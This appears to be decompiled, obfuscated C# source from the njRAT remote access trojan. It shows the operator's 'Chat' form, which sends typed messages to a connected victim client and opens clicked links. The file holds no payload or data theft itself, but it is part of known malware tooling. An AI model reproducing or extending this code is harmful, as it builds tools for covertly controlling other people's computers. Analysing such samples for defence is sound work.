using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000035 RID: 53
	[DesignerGenerated]
	public partial class Chat : Form
	{
		// Token: 0x06000159 RID: 345 RVA: 0x00011F64 File Offset: 0x00010164
		public Chat()
		{
			base.FormClosing += this.\u0002;
			base.Load += this.\u0005;
			this.hk = \u0006\u2001.\u0002(-1829138689);
			this.\u0002();
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00011FFC File Offset: 0x000101FC
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Chat));
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(new RichTextBox());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(new Panel());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(new TextBox());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(new Button());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			this.SuspendLayout();
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.Lime;
			Control control = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 0);
			control.Location = location;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829140062);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
			Control control2 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(399, 156);
			control2.Size = size;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002());
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control3 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 156);
			control3.Location = location;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138482);
			Control control4 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			size = new Size(399, 29);
			control4.Size = size;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.Lime;
			Control control5 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control5.Location = location;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Multiline = true;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138738);
			Control control6 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			size = new Size(324, 29);
			control6.Size = size;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Right;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control7 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			location = new Point(324, 0);
			control7.Location = location;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control8 = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
			size = new Size(75, 29);
			control8.Size = size;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138710);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = false;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(399, 185);
			this.ClientSize = size;
			this.Controls.Add(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002());
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.Name = \u0006\u2001.\u0002(-1829138747);
			this.Opacity = 0.9;
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = \u0006\u2001.\u0002(-1829138747);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().PerformLayout();
			this.ResumeLayout(false);
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00012404 File Offset: 0x00010604
		internal virtual RichTextBox ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00012418 File Offset: 0x00010618
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(RichTextBox \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008);
			LinkClickedEventHandler value2 = new LinkClickedEventHandler(this.\u0002);
			if (this.\u0003 != null)
			{
				this.\u0003.TextChanged -= value;
				this.\u0003.LinkClicked -= value2;
			}
			this.\u0003 = \u0002;
			if (this.\u0003 != null)
			{
				this.\u0003.TextChanged += value;
				this.\u0003.LinkClicked += value2;
			}
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00012490 File Offset: 0x00010690
		internal virtual Panel ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x0600015F RID: 351 RVA: 0x000124A4 File Offset: 0x000106A4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(Panel \u0002)
		{
			this.\u0005 = \u0002;
		}

		// Token: 0x06000160 RID: 352 RVA: 0x000124B0 File Offset: 0x000106B0
		internal virtual TextBox ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000161 RID: 353 RVA: 0x000124C4 File Offset: 0x000106C4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(TextBox \u0002)
		{
			KeyEventHandler value = new KeyEventHandler(this.\u0002);
			if (this.\u0008 != null)
			{
				this.\u0008.KeyDown -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.KeyDown += value;
			}
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00012514 File Offset: 0x00010714
		internal virtual Button ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00012528 File Offset: 0x00010728
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002);
			if (this.\u0006 != null)
			{
				this.\u0006.Click -= value;
			}
			this.\u0006 = \u0002;
			if (this.\u0006 != null)
			{
				this.\u0006.Click += value;
			}
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00012578 File Offset: 0x00010778
		internal virtual Timer ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x06000165 RID: 357 RVA: 0x0001258C File Offset: 0x0001078C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003);
			if (this.\u000E != null)
			{
				this.\u000E.Tick -= value;
			}
			this.\u000E = \u0002;
			if (this.\u000E != null)
			{
				this.\u000E.Tick += value;
			}
		}

		// Token: 0x06000166 RID: 358 RVA: 0x000125DC File Offset: 0x000107DC
		private void \u0002(object \u0002, KeyEventArgs \u0003)
		{
			Keys keyCode = \u0003.KeyCode;
			if (keyCode == Keys.Return)
			{
				\u0003.SuppressKeyPress = true;
				if (Operators.CompareString(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text, string.Empty, false) == 0)
				{
					return;
				}
				lock (this)
				{
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = new Font(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font, FontStyle.Bold);
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(\u0006\u2001.\u0002(-1829138726) + this.hk + \u0006\u2001.\u0002(-1829138734));
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font;
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text + \u0006\u2001.\u0002(-1829139159));
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
					Client client = this.sk;
					string str = \u0006\u2001.\u0002(-1829138798);
					string u000E = \u000E\u2000.\u000E;
					TextBox textBox = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
					string text = textBox.Text;
					string str2 = global::\u000E.\u0002(ref text);
					textBox.Text = text;
					client.Send(str + u000E + str2);
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
					return;
				}
			}
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Select();
		}

		// Token: 0x06000167 RID: 359 RVA: 0x00012760 File Offset: 0x00010960
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text, string.Empty, false) == 0)
			{
				return;
			}
			lock (this)
			{
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = new Font(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font, FontStyle.Bold);
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(\u0006\u2001.\u0002(-1829138726) + this.hk + \u0006\u2001.\u0002(-1829138734));
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font;
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text + \u0006\u2001.\u0002(-1829139159));
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
				Client client = this.sk;
				string str = \u0006\u2001.\u0002(-1829138798);
				string u000E = \u000E\u2000.\u000E;
				TextBox textBox = this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002();
				string text = textBox.Text;
				string str2 = global::\u000E.\u0002(ref text);
				textBox.Text = text;
				client.Send(str + u000E + str2);
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
			}
		}

		// Token: 0x06000168 RID: 360 RVA: 0x000128C0 File Offset: 0x00010AC0
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			if (this.sk == null | this.osk == null)
			{
				if (this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled | Operators.CompareString(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text, string.Empty, false) == 0)
				{
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(\u0006\u2001.\u0002(-1829139168));
				}
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.sk.Send(\u0006\u2001.\u0002(-1829138768));
				this.sk.CN = false;
				this.Close();
			}
			else if (!this.sk.CN | !this.osk.CN)
			{
				if (this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled | Operators.CompareString(this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Text, string.Empty, false) == 0)
				{
					this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(\u0006\u2001.\u0002(-1829139168));
				}
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.sk.Send(\u0006\u2001.\u0002(-1829138768));
				this.sk.CN = false;
				this.Close();
			}
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00012A0C File Offset: 0x00010C0C
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			if (this.sk.CN)
			{
				this.sk.Send(\u0006\u2001.\u0002(-1829138768));
			}
			this.sk.CN = false;
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00012A40 File Offset: 0x00010C40
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			this.Text = Conversions.ToString(\u000E\u2000.\u0002(this.osk.L));
			this.Show();
			string left = Interaction.InputBox(\u0006\u2001.\u0002(-1829139191), \u0006\u2001.\u0002(-1829138747), this.hk, -1, -1);
			if (Operators.CompareString(left, string.Empty, false) == 0)
			{
				this.sk.CN = false;
			}
			else
			{
				this.hk = left;
				this.sk.Send(\u0006\u2001.\u0002(-1829139089) + \u000E\u2000.\u000E + global::\u000E.\u0002(ref this.hk));
			}
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = true;
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Select();
			this.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Focus();
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00012B08 File Offset: 0x00010D08
		private void \u0002(object \u0002, LinkClickedEventArgs \u0003)
		{
			try
			{
				Process.Start(\u0003.LinkText);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00012B48 File Offset: 0x00010D48
		private void \u0008(object \u0002, EventArgs \u0003)
		{
		}

		// Token: 0x040000FF RID: 255
		[AccessedThroughProperty("T1")]
		private RichTextBox \u0003;

		// Token: 0x04000100 RID: 256
		[AccessedThroughProperty("Panel1")]
		private Panel \u0005;

		// Token: 0x04000101 RID: 257
		[AccessedThroughProperty("T2")]
		private TextBox \u0008;

		// Token: 0x04000102 RID: 258
		[AccessedThroughProperty("Button1")]
		private Button \u0006;

		// Token: 0x04000103 RID: 259
		[AccessedThroughProperty("Timer1")]
		private Timer \u000E;

		// Token: 0x04000104 RID: 260
		public Client sk;

		// Token: 0x04000105 RID: 261
		public Client osk;

		// Token: 0x04000106 RID: 262
		public string hk;
	}
}
